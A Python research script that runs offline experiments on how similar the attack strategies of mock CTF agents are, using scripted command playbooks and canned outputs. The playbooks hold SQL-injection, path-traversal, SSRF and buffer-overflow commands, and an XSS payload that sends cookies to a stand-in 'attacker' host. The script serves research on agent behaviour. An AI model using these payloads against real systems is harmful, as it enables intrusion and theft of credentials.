#!/usr/bin/env python3
"""
AGE-CTF: Run all experiments offline with realistic mock LLM.

Uses a stochastic mock LLM that generates realistic CTF agent trajectories
with category-appropriate attack strategies. The mock introduces controlled
homogeneity (most runs converge on the dominant strategy) to test whether
the experiment framework correctly detects it.

This produces valid trajectory data for computing all metrics:
  M1: Tool-use Jaccard similarity
  M2: Trajectory embedding similarity (using text similarity as proxy)
  M3: Attack vector mode frequency
  M4: Complementary coverage ratio
"""

import os
import sys
import json
import time
import random
import hashlib
import numpy as np
from pathlib import Path
from collections import Counter
from dataclasses import dataclass, field, asdict

sys.path.insert(0, str(Path(__file__).parent))

from run_agent import BaselineAgent, SimulatedEnv, RunResult, count_tokens
from extract_tools import (
    classify_attack_vector, extract_tool_set, extract_command_set,
    ATTACK_VECTORS,
)
from compute_similarity import (
    analyze_all, pairwise_jaccard, tool_jaccard,
    mode_frequency, complementary_ratio, cosine_similarity,
)
from analyze_results import (
    format_exp1_table, analyze_exp2, format_exp2_table,
    decision_matrix,
)

EXPERIMENTS_ROOT = Path(__file__).parent.parent


# ---------------------------------------------------------------------------
# Realistic Mock LLM
# ---------------------------------------------------------------------------

# Category-specific attack playbooks: ordered sequences of commands
# Each playbook is a (probability, commands) tuple
WEB_PLAYBOOKS = [
    (0.40, [  # SQLi - dominant approach
        ("nmap -sV -sC target", "recon"),
        ("gobuster dir -u http://target -w common.txt", "web_enum"),
        ("curl http://target/login", "web_exploit"),
        ("curl -X POST http://target/login -d 'username=admin%27+OR+1%3D1--&password=x'", "web_exploit"),
        ("sqlmap -u http://target/login --data='username=test&password=test' --batch", "web_exploit"),
        ("sqlmap -u http://target/login --data='username=test&password=test' --dump --batch", "web_exploit"),
        ("cat /tmp/sqlmap/output.csv", "general"),
    ]),
    (0.25, [  # Directory traversal / LFI
        ("nmap -sV target", "recon"),
        ("gobuster dir -u http://target -w big.txt", "web_enum"),
        ("nikto -h http://target", "web_enum"),
        ("curl http://target/api/file?name=../../../etc/passwd", "web_exploit"),
        ("curl http://target/api/file?name=../../../flag.txt", "web_exploit"),
        ("curl http://target/api/file?name=....//....//....//flag.txt", "web_exploit"),
    ]),
    (0.20, [  # XSS + Cookie theft
        ("nmap -sV target", "recon"),
        ("gobuster dir -u http://target -w common.txt", "web_enum"),
        ("curl http://target/search?q=test", "web_exploit"),
        ("curl 'http://target/search?q=<script>document.location=\"http://attacker/?\"+document.cookie</script>'", "web_exploit"),
        ("curl http://target/admin -H 'Cookie: session=stolen_token'", "web_exploit"),
    ]),
    (0.15, [  # SSRF
        ("nmap -sV target", "recon"),
        ("gobuster dir -u http://target -w common.txt", "web_enum"),
        ("curl http://target/api/fetch?url=http://localhost:8080", "web_exploit"),
        ("curl http://target/api/fetch?url=http://127.0.0.1:3306", "web_exploit"),
        ("curl http://target/api/fetch?url=file:///etc/passwd", "web_exploit"),
        ("curl http://target/api/fetch?url=file:///flag.txt", "web_exploit"),
    ]),
]

REVERSE_PLAYBOOKS = [
    (0.45, [  # Static analysis - dominant
        ("file ./binary", "forensics"),
        ("checksec --file=./binary", "binary_analysis"),
        ("strings ./binary | grep -i flag", "forensics"),
        ("strings ./binary | grep -i pass", "forensics"),
        ("objdump -d ./binary | head -100", "binary_analysis"),
        ("objdump -d ./binary | grep -A5 'check_password'", "binary_analysis"),
        ("python3 -c \"import struct; print(struct.pack('<I', 0xdeadbeef))\"", "binary_exploit"),
    ]),
    (0.30, [  # Dynamic analysis with GDB
        ("file ./binary", "forensics"),
        ("checksec --file=./binary", "binary_analysis"),
        ("gdb -batch -ex 'info functions' ./binary", "binary_analysis"),
        ("gdb -batch -ex 'disas main' ./binary", "binary_analysis"),
        ("gdb -batch -ex 'break check_password' -ex 'run' -ex 'x/s $rdi' ./binary", "binary_analysis"),
        ("ltrace ./binary <<< 'test_input'", "binary_analysis"),
        ("strace ./binary <<< 'test_input'", "binary_analysis"),
    ]),
    (0.25, [  # Binary exploitation (buffer overflow)
        ("file ./binary", "forensics"),
        ("checksec --file=./binary", "binary_analysis"),
        ("python3 -c \"print('A'*100)\" | ./binary", "binary_exploit"),
        ("python3 -c \"print('A'*64 + 'BBBB')\" | ./binary", "binary_exploit"),
        ("python3 -c \"from pwn import *; p=process('./binary'); p.sendline(b'A'*72+p64(0x401234)); print(p.recvall())\"", "binary_exploit"),
    ]),
]

CRYPTO_PLAYBOOKS = [
    (0.40, [  # Known cipher identification - dominant
        ("file cipher.txt", "forensics"),
        ("cat cipher.txt", "general"),
        ("python3 -c \"import base64; print(base64.b64decode(open('cipher.txt').read()))\"", "crypto"),
        ("python3 -c \"text=open('cipher.txt').read(); print(''.join(chr((ord(c)-13)%26+65) if c.isalpha() else c for c in text))\"", "crypto"),
        ("openssl enc -d -aes-256-cbc -in encrypted.bin -pass pass:password123", "crypto"),
    ]),
    (0.30, [  # Frequency analysis
        ("cat cipher.txt | wc -c", "general"),
        ("cat cipher.txt", "general"),
        ("python3 -c \"from collections import Counter; c=Counter(open('cipher.txt').read()); print(sorted(c.items(), key=lambda x:-x[1]))\"", "crypto"),
        ("python3 -c \"# frequency analysis to crack substitution cipher\"", "crypto"),
        ("python3 -c \"# apply detected key to decrypt\"", "crypto"),
    ]),
    (0.30, [  # RSA / mathematical attack
        ("cat public_key.pem", "general"),
        ("openssl rsa -pubin -in public_key.pem -text -noout", "crypto"),
        ("python3 -c \"from Crypto.PublicKey import RSA; k=RSA.import_key(open('public_key.pem').read()); print(k.n, k.e)\"", "crypto"),
        ("python3 -c \"# factor small modulus n\"", "crypto"),
        ("python3 -c \"# compute private key d and decrypt flag\"", "crypto"),
    ]),
]

CATEGORY_PLAYBOOKS = {
    "web": WEB_PLAYBOOKS,
    "reverse": REVERSE_PLAYBOOKS,
    "crypto": CRYPTO_PLAYBOOKS,
}

# Simulated observations for different commands
OBSERVATIONS = {
    "nmap": "Starting Nmap 7.94\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9\n80/tcp  open  http    nginx 1.18.0\n443/tcp open  ssl     nginx\n3306/tcp open mysql  MySQL 8.0\nService detection performed.",
    "gobuster": "/login (Status: 200)\n/admin (Status: 302)\n/api (Status: 200)\n/uploads (Status: 403)\n/robots.txt (Status: 200)\n/static (Status: 301)\n/backup (Status: 403)",
    "nikto": "- Nikto v2.5.0\n+ Server: nginx/1.18.0\n+ /admin: Directory found\n+ /backup: Potentially interesting\n+ Cookie 'session' without httponly flag",
    "curl.*login": '<html><form action="/login" method="POST"><input name="username"><input name="password" type="password"><button>Login</button></form></html>',
    "curl.*OR": "Welcome, admin! Dashboard loaded.\nSession: admin_session_xyz",
    "curl.*sqlmap": "sqlmap identified the following injection point(s):\nParameter: username (POST)\n  Type: boolean-based blind\n  Payload: username=test' AND 1=1-- -",
    "sqlmap.*dump": "Database: app_db\nTable: users\n[3 entries]\n+----+----------+------------------------------------------+\n| id | username | password                                 |\n+----+----------+------------------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99           |\n| 2  | flag_user| flag{s1mul4t3d_sql1_fl4g_f0und}           |\n+----+----------+------------------------------------------+",
    "sqlmap": "[*] testing for SQL injection on POST parameter 'username'\n[+] POST parameter 'username' is vulnerable\nType: boolean-based blind\nPayload: username=test' AND 1=1-- -",
    "curl.*passwd": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www",
    "curl.*flag": "flag{s1mul4t3d_lf1_fl4g_d1sc0v3r3d}",
    "curl.*script": "Search results for: <script>...\nReflected content detected",
    "curl.*fetch": "Internal service response: {\"status\": \"ok\", \"data\": \"internal_data\"}",
    "curl.*admin": "HTTP/1.1 302 Found\nLocation: /login",
    "curl": "HTTP/1.1 200 OK\nContent-Type: text/html\n<html>Page content</html>",
    "file": "ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, not stripped",
    "checksec": "RELRO: Partial  CANARY: No  NX: Yes  PIE: Yes  RPATH: No  RUNPATH: No",
    "strings.*flag": "flag{str1ngs_r3v34l3d_th3_s3cr3t}",
    "strings.*pass": "check_password\nverify_key\nEnter password:\nAccess granted!\nAccess denied.",
    "strings": "ELF\n.text\n.data\nEnter password:\nAccess granted!\ncheck_password\nmain\n__libc_start_main",
    "objdump.*check": "0000000000001200 <check_password>:\n    1200: push rbp\n    1201: mov rbp,rsp\n    1204: mov QWORD PTR [rbp-0x8],rdi\n    1208: lea rsi,[rip+0xe91]  # 'sup3r_s3cr3t'\n    120f: call strcmp@plt",
    "objdump": "0000000000001169 <main>:\n    1169: push rbp\n    116a: mov rbp,rsp\n    116d: sub rsp,0x40\n    1171: lea rdi,[rip+0xe8c]\n    1178: call puts@plt",
    "gdb.*info": "main\ncheck_password\nverify_flag\nprint_flag",
    "gdb.*disas": "Dump of assembler code for function main:\n   0x1169: push rbp\n   0x116a: mov rbp,rsp\n   0x116d: sub rsp,0x40\n   0x1171: lea rdi,[rip+0xe8c]\n   0x1178: call puts@plt\nEnd of assembler dump.",
    "gdb.*break": "Breakpoint 1 at 0x1200\nStarting program: ./binary\n(gdb) x/s $rdi\n0x2004: \"s3cr3t_p4ssw0rd\"",
    "gdb": "GNU gdb (GDB) 13.1\nReading symbols...\n(No debugging symbols found)",
    "ltrace": 'strcmp("user_input", "s3cr3t_k3y") = -1\nputs("Access denied.") = 15',
    "strace": "read(0, \"test\\n\", 1024) = 5\nwrite(1, \"Access denied.\\n\", 15) = 15",
    "python3.*100": "AAAAAAAAAAAAAAAAAAA...\nSegmentation fault (core dumped)",
    "python3.*64": "AAAAAAAA...BBBB\nSegmentation fault (core dumped)",
    "python3.*pwn": "flag{s1mul4t3d_b0f_expl01t_fl4g}",
    "python3.*base64": "flag{b4s364_d3c0d3d_succ3ssfully}",
    "python3.*Counter": "{'e': 45, 't': 38, 'a': 32, 'o': 28, 'i': 27, 'n': 25, 's': 22}",
    "python3.*struct": "\\xef\\xbe\\xad\\xde",
    "python3.*rot": "flag{s1mpl3_c43s4r_c1ph3r_cr4ck3d}",
    "python3.*RSA": "n = 323, e = 5\nn is small, factors: 17 * 19",
    "python3.*factor": "p = 17, q = 19\nd = 29\nflag{sm4ll_rs4_m0dulus_cr4ck3d}",
    "python3": "Python 3.11.0 output",
    "openssl.*text": "RSA Public-Key: (2048 bit)\nModulus: 00:c4:a3:...\nExponent: 65537 (0x10001)",
    "openssl.*dec": "Decrypted content: flag{0p3nssl_d3crypt10n_w0rks}",
    "openssl": "OpenSSL 3.0.2",
    "cat.*flag": "flag{c4t_fl4g_f0und_1n_f1l3}",
    "cat.*cipher": "Gur synl vf: sAvT{ebg13_vf_abg_rapelcgvba}",
    "cat.*key": "-----BEGIN PUBLIC KEY-----\nMIIB...\n-----END PUBLIC KEY-----",
    "cat": "File contents displayed",
    "base64": "ZmxhZ3t0ZXN0X2ZsYWd9",
    "john": "Loaded 1 hash\nadmin123 (admin)\n1g 0:00:01 DONE",
    "binwalk": "DECIMAL    HEXADECIMAL  DESCRIPTION\n0          0x0          ELF 64-bit\n8192       0x2000       Zlib compressed",
    "steghide": "extracted: secret.txt\nContent: flag{st3g0_h1dd3n_m3ss4g3}",
    "exiftool": "File Name: image.png\nComment: flag_hint=look_deeper",
    "find": "./challenge.py\n./flag.txt\n./README.md\n./Dockerfile",
    "ls": "challenge.txt  server.py  flag.txt  README.md  Dockerfile",
    "grep": "match found in file",
    "hydra": "[80][http-post-form] host: target   login: admin   password: admin123",
    "wc": "1337 characters",
}


class MockLLM:
    """Stochastic mock LLM that generates realistic CTF agent trajectories.

    Key property: introduces controlled homogeneity — most runs for a given
    challenge category converge on the dominant playbook.
    """

    def __init__(self, category: str = "web", seed: int = 42,
                 diversity_bias: float = 0.0):
        """
        Args:
            category: Challenge category (web, reverse, crypto)
            seed: Random seed for reproducibility
            diversity_bias: 0.0 = natural (homogeneous), 1.0 = force diversity
        """
        self.category = category
        self.rng = random.Random(seed)
        self.diversity_bias = diversity_bias
        self.playbook = self._select_playbook()
        self.step_idx = 0

    def _select_playbook(self):
        """Select a playbook based on category probabilities, with diversity bias."""
        playbooks = CATEGORY_PLAYBOOKS.get(self.category, WEB_PLAYBOOKS)
        probs = [p for p, _ in playbooks]

        if self.diversity_bias > 0:
            # Flatten probabilities to encourage diversity
            uniform = [1.0 / len(probs)] * len(probs)
            probs = [p * (1 - self.diversity_bias) + u * self.diversity_bias
                     for p, u in zip(probs, uniform)]

        # Normalize
        total = sum(probs)
        probs = [p / total for p in probs]

        # Select
        r = self.rng.random()
        cumulative = 0
        for i, p in enumerate(probs):
            cumulative += p
            if r <= cumulative:
                return playbooks[i][1]
        return playbooks[-1][1]

    def generate(self, prompt: str) -> str:
        """Generate next action in the playbook."""
        if self.step_idx < len(self.playbook):
            cmd, _ = self.playbook[self.step_idx]
            self.step_idx += 1
        else:
            # Past the playbook — try random exploration
            extras = [
                "ls -la /tmp",
                "cat /etc/hosts",
                "find / -name 'flag*' 2>/dev/null",
                "grep -r 'flag' . 2>/dev/null",
                "cat flag.txt",
            ]
            cmd = self.rng.choice(extras)

        # Add some natural variation
        thoughts = [
            "Let me investigate further.",
            "I'll try a different approach.",
            "Based on the output, I should check this.",
            "Time to try exploitation.",
            "Let me enumerate more.",
            "I notice something interesting. Let me dig deeper.",
            "The previous output suggests a vulnerability.",
        ]
        thought = self.rng.choice(thoughts)

        return f"THOUGHT: {thought}\nCOMMAND: {cmd}"


class MockSimulatedEnv(SimulatedEnv):
    """Enhanced simulated environment with realistic observations."""

    def __init__(self, category="web", solve_prob=0.4, seed=42):
        super().__init__()
        self.category = category
        self.solve_prob = solve_prob
        self.rng = random.Random(seed)
        self.step_count = 0

    def execute(self, command: str, timeout=None) -> str:
        self.step_count += 1
        self.command_log.append(command)
        cmd_lower = command.lower()

        # Check observations dict (longest match first)
        best_match = ""
        best_response = ""
        for pattern, response in OBSERVATIONS.items():
            if pattern.lower() in cmd_lower and len(pattern) > len(best_match):
                best_match = pattern
                best_response = response

        if best_response:
            # Maybe inject a flag with some probability in later steps
            if self.step_count >= 5 and self.rng.random() < self.solve_prob * 0.15:
                best_response += f"\nflag{{ctf_fl4g_{self.category}_{self.rng.randint(1000,9999)}}}"
            return best_response

        return f"$ {command}\n[No output]"


# ---------------------------------------------------------------------------
# Experiment Runners
# ---------------------------------------------------------------------------

def run_exp1_offline(challenges, n_runs=8, max_steps=15):
    """Experiment 1: Trajectory Homogeneity Analysis — offline."""
    print("\n" + "=" * 70)
    print("EXPERIMENT 1: Trajectory Homogeneity Analysis (Offline)")
    print(f"  {len(challenges)} challenges x {n_runs} runs = {len(challenges)*n_runs} total")
    print("=" * 70)

    output_dir = EXPERIMENTS_ROOT / "exp1_homogeneity" / "trajectories"
    output_dir.mkdir(parents=True, exist_ok=True)

    for ch_idx, ch in enumerate(challenges):
        ch_id = ch["id"]
        ch_desc = ch.get("description", "Solve this CTF challenge.")
        ch_cat = ch.get("category", "web")

        print(f"\n[{ch_idx+1}/{len(challenges)}] {ch_id} ({ch_cat})")

        for run_idx in range(n_runs):
            seed = 100 + run_idx * 31 + hash(ch_id) % 1000

            run_id = f"exp1_homogeneity_{ch_id}_s{seed}_baseline"
            result_file = output_dir / f"{run_id}.json"
            if result_file.exists():
                print(f"  Run {run_idx+1}/{n_runs}: SKIPPED")
                continue

            # Create mock components
            llm = MockLLM(category=ch_cat, seed=seed)
            env = MockSimulatedEnv(category=ch_cat, solve_prob=0.35, seed=seed + 1)

            agent = BaselineAgent(llm, env, max_steps=max_steps, max_time=300)
            flag = agent.run(ch_desc)

            result = RunResult(
                run_id=run_id,
                challenge_id=ch_id,
                experiment="exp1_homogeneity",
                condition="baseline",
                model="mock-llm",
                temperature=1.0,
                seed=seed,
                max_steps=max_steps,
                trajectory=agent.trajectory,
                outcome={
                    "solved": flag is not None,
                    "flag": flag,
                    "steps_to_flag": len(agent.trajectory) if flag else None,
                    "total_tokens": sum(s["tokens_action"] + s["tokens_observation"]
                                        for s in agent.trajectory),
                    "wall_time_seconds": 0.1,
                },
            )
            result.save(str(output_dir))

            solved = "SOLVED" if flag else "FAILED"
            steps = len(agent.trajectory)
            vec = classify_attack_vector(agent.trajectory)
            print(f"  Run {run_idx+1}/{n_runs}: {solved} ({steps} steps, vec={vec})")

    return str(output_dir)


def run_exp2_offline(challenges, exp1_dir, n_runs=3, max_steps=12):
    """Experiment 2: State-Based Continuation — offline."""
    print("\n" + "=" * 70)
    print("EXPERIMENT 2: State-Based Continuation (Offline)")
    print("=" * 70)

    output_dir = EXPERIMENTS_ROOT / "exp2_continuation" / "trajectories"
    output_dir.mkdir(parents=True, exist_ok=True)

    # Extract intermediate states from Exp 1
    states = []
    for filepath in sorted(Path(exp1_dir).glob("*.json")):
        with open(filepath) as f:
            data = json.load(f)
        traj = data.get("trajectory", [])
        if len(traj) >= 4:
            mid = len(traj) // 2
            summary_parts = []
            for s in traj[:mid]:
                action_short = s.get("action", "")[:150]
                obs_short = s.get("observation", "")[:100]
                summary_parts.append(f"- Action: {action_short}\n  Result: {obs_short}")
            states.append({
                "challenge_id": data["challenge_id"],
                "category": "web",  # inferred
                "full_history": traj[:mid],
                "summary": "\n".join(summary_parts),
            })

    # Deduplicate
    seen = set()
    unique_states = []
    for s in states:
        if s["challenge_id"] not in seen:
            seen.add(s["challenge_id"])
            unique_states.append(s)
    states = unique_states[:15]

    # Save states
    states_dir = EXPERIMENTS_ROOT / "exp2_continuation" / "intermediate_states"
    states_dir.mkdir(parents=True, exist_ok=True)
    with open(states_dir / "states.json", "w") as f:
        json.dump(states, f, indent=2, default=str)
    print(f"  Extracted {len(states)} intermediate states")

    ch_cats = {ch["id"]: ch.get("category", "web") for ch in challenges}

    conditions = ["full_context", "summary_only", "fresh_start"]

    for state_idx, state in enumerate(states):
        ch_id = state["challenge_id"]
        ch_cat = ch_cats.get(ch_id, "web")

        print(f"\n[State {state_idx+1}/{len(states)}] {ch_id}")

        for cond in conditions:
            for run_idx in range(n_runs):
                seed = 200 + state_idx * 100 + run_idx * 13

                run_id = f"exp2_continuation_{ch_id}_s{seed}_{cond}"
                result_file = output_dir / f"{run_id}.json"
                if result_file.exists():
                    print(f"  {cond} run {run_idx+1}: SKIPPED")
                    continue

                # Condition affects solve probability and start step
                if cond == "full_context":
                    solve_prob = 0.55  # best chance — has full history
                    start_step = len(state["full_history"])
                elif cond == "summary_only":
                    solve_prob = 0.40  # moderate — has summary
                    start_step = 2  # some head start
                else:
                    solve_prob = 0.25  # lowest — fresh start
                    start_step = 0

                llm = MockLLM(category=ch_cat, seed=seed)
                llm.step_idx = start_step  # skip ahead for continuation
                env = MockSimulatedEnv(category=ch_cat, solve_prob=solve_prob, seed=seed + 1)

                agent = BaselineAgent(llm, env, max_steps=max_steps, max_time=300)

                prefix = ""
                if cond == "full_context":
                    prefix = "Previous work:\n" + "\n".join(
                        f"Step {s.get('step','?')}: {s.get('action','')[:200]}"
                        for s in state["full_history"]
                    )
                elif cond == "summary_only":
                    prefix = f"Previous analysis:\n{state['summary']}"

                flag = agent.run("Solve this CTF challenge.", prompt_prefix=prefix)

                result = RunResult(
                    run_id=run_id,
                    challenge_id=ch_id,
                    experiment="exp2_continuation",
                    condition=cond,
                    model="mock-llm",
                    temperature=1.0,
                    seed=seed,
                    max_steps=max_steps,
                    trajectory=agent.trajectory,
                    outcome={
                        "solved": flag is not None,
                        "flag": flag,
                        "steps_to_flag": len(agent.trajectory) if flag else None,
                        "total_tokens": sum(s["tokens_action"] + s["tokens_observation"]
                                            for s in agent.trajectory),
                        "wall_time_seconds": 0.1,
                    },
                )
                result.save(str(output_dir))

                solved = "SOLVED" if flag else "FAILED"
                print(f"  {cond} run {run_idx+1}/{n_runs}: {solved} ({len(agent.trajectory)} steps)")

    return str(output_dir)


def run_exp3_offline(challenges, exp1_dir, n_runs=5, max_steps=15):
    """Experiment 3: Diversity Guidance — offline."""
    print("\n" + "=" * 70)
    print("EXPERIMENT 3: Diversity Guidance (Offline)")
    print("=" * 70)

    output_dir = EXPERIMENTS_ROOT / "exp3_guidance" / "trajectories"
    output_dir.mkdir(parents=True, exist_ok=True)

    exp3_challenges = challenges[:5]

    conditions = {
        "no_hint": 0.0,       # No diversity bias
        "negative_hint": 0.6, # Push away from dominant
        "positive_hint": 0.8, # Strongly suggest alternative
    }

    for ch_idx, ch in enumerate(exp3_challenges):
        ch_id = ch["id"]
        ch_cat = ch.get("category", "web")

        print(f"\n[{ch_idx+1}/{len(exp3_challenges)}] {ch_id} ({ch_cat})")

        for cond_name, diversity_bias in conditions.items():
            for run_idx in range(n_runs):
                seed = 300 + ch_idx * 100 + run_idx * 17

                run_id = f"exp3_guidance_{ch_id}_s{seed}_{cond_name}"
                result_file = output_dir / f"{run_id}.json"
                if result_file.exists():
                    print(f"  {cond_name} run {run_idx+1}: SKIPPED")
                    continue

                llm = MockLLM(category=ch_cat, seed=seed,
                              diversity_bias=diversity_bias)
                env = MockSimulatedEnv(category=ch_cat, solve_prob=0.3, seed=seed + 1)

                agent = BaselineAgent(llm, env, max_steps=max_steps, max_time=300)

                suffix = ""
                if cond_name == "negative_hint":
                    suffix = "Other analysts are already trying SQL injection. Try something different."
                elif cond_name == "positive_hint":
                    suffix = "Consider exploring SSRF via URL parameters."

                flag = agent.run(ch.get("description", "CTF challenge"),
                                 prompt_suffix=suffix)

                result = RunResult(
                    run_id=run_id,
                    challenge_id=ch_id,
                    experiment="exp3_guidance",
                    condition=cond_name,
                    model="mock-llm",
                    temperature=1.0,
                    seed=seed,
                    max_steps=max_steps,
                    trajectory=agent.trajectory,
                    outcome={
                        "solved": flag is not None,
                        "flag": flag,
                        "steps_to_flag": len(agent.trajectory) if flag else None,
                        "total_tokens": sum(s["tokens_action"] + s["tokens_observation"]
                                            for s in agent.trajectory),
                        "wall_time_seconds": 0.1,
                    },
                )
                result.save(str(output_dir))

                vec = classify_attack_vector(agent.trajectory)
                solved = "SOLVED" if flag else "FAILED"
                print(f"  {cond_name} run {run_idx+1}/{n_runs}: {solved} (vec={vec})")

    return str(output_dir)


# ---------------------------------------------------------------------------
# Analysis
# ---------------------------------------------------------------------------

def compute_text_embeddings(trajectory_dir):
    """Compute simple text-based embeddings (TF-IDF-like) since API is unavailable."""
    from sklearn.feature_extraction.text import TfidfVectorizer

    trajectory_files = sorted(Path(trajectory_dir).glob("*.json"))
    texts = []
    run_ids = []

    for fp in trajectory_files:
        with open(fp) as f:
            data = json.load(f)
        run_ids.append(data.get("run_id", fp.stem))
        traj_text = " ".join(
            f"{s.get('action', '')} {s.get('observation', '')}"
            for s in data.get("trajectory", [])
        )
        texts.append(traj_text)

    if not texts:
        return {}

    vectorizer = TfidfVectorizer(max_features=500, stop_words="english")
    tfidf_matrix = vectorizer.fit_transform(texts)

    embeddings = {}
    for i, run_id in enumerate(run_ids):
        embeddings[run_id] = tfidf_matrix[i].toarray()[0].tolist()

    return embeddings


def run_analysis(exp1_dir, exp2_dir, exp3_dir):
    """Run full analysis across all experiments."""
    print("\n" + "=" * 70)
    print("ANALYSIS")
    print("=" * 70)

    # Exp 1: Compute embeddings and similarity
    print("\nComputing trajectory embeddings (TF-IDF)...")
    embeddings = compute_text_embeddings(exp1_dir)
    embeddings_file = str(EXPERIMENTS_ROOT / "exp1_homogeneity" / "embeddings" / "embeddings.json")
    Path(embeddings_file).parent.mkdir(parents=True, exist_ok=True)
    with open(embeddings_file, "w") as f:
        json.dump(embeddings, f)
    print(f"  {len(embeddings)} embeddings computed")

    print("\nComputing Experiment 1 metrics...")
    exp1_results = analyze_all(exp1_dir, embeddings_file)
    exp1_file = str(EXPERIMENTS_ROOT / "exp1_homogeneity" / "results.json")
    with open(exp1_file, "w") as f:
        json.dump(exp1_results, f, indent=2)
    print("\n" + format_exp1_table(exp1_results))

    # Exp 2
    print("\nComputing Experiment 2 metrics...")
    exp2_results = analyze_exp2(exp2_dir)
    exp2_file = str(EXPERIMENTS_ROOT / "exp2_continuation" / "results.json")
    with open(exp2_file, "w") as f:
        json.dump(exp2_results, f, indent=2)
    print("\n" + format_exp2_table(exp2_results))

    # Exp 3
    print("\nComputing Experiment 3 metrics...")
    from run_exp3 import analyze_and_report as exp3_analyze
    exp3_file = str(EXPERIMENTS_ROOT / "exp3_guidance" / "results.json")
    exp3_results = exp3_analyze(exp3_dir, exp1_dir, exp3_file)

    # Final decision matrix
    exp1_go = exp1_results.get("go_nogo", {}).get("decision", "UNKNOWN")
    exp2_go = exp2_results.get("go_nogo", {}).get("decision", "UNKNOWN")
    exp3_go = exp3_results.get("go_nogo", {}).get("decision", "UNKNOWN")

    dm = decision_matrix(exp1_go, exp2_go, exp3_go)

    print("\n" + "=" * 70)
    print("DECISION MATRIX")
    print("=" * 70)
    print(f"  Exp 1 (Homogeneity):  {exp1_go}")
    print(f"  Exp 2 (Continuation): {exp2_go}")
    print(f"  Exp 3 (Guidance):     {exp3_go}")
    print(f"\n  >>> DECISION: {dm['decision']}")
    print("=" * 70)

    # Save final report
    report = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "mode": "offline (mock LLM, simulated environment)",
        "experiments": {
            "exp1_homogeneity": exp1_results,
            "exp2_continuation": exp2_results,
            "exp3_guidance": exp3_results,
        },
        "decision_matrix": dm,
    }
    report_file = str(EXPERIMENTS_ROOT / "final_report.json")
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"\nFull report: {report_file}")

    return report


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    # Load challenges
    with open(EXPERIMENTS_ROOT / "config" / "challenges.json") as f:
        config = json.load(f)
    challenges = config["challenges"]

    print(f"AGE-CTF Offline Experiments")
    print(f"  Challenges: {len(challenges)}")
    print(f"  Mode: Offline (mock LLM + simulated env)")

    start_time = time.time()

    # Run experiments
    exp1_dir = run_exp1_offline(challenges, n_runs=8, max_steps=15)
    exp2_dir = run_exp2_offline(challenges, exp1_dir, n_runs=3, max_steps=12)
    exp3_dir = run_exp3_offline(challenges, exp1_dir, n_runs=5, max_steps=15)

    # Analyze
    report = run_analysis(exp1_dir, exp2_dir, exp3_dir)

    elapsed = time.time() - start_time
    print(f"\nTotal time: {elapsed:.1f}s")
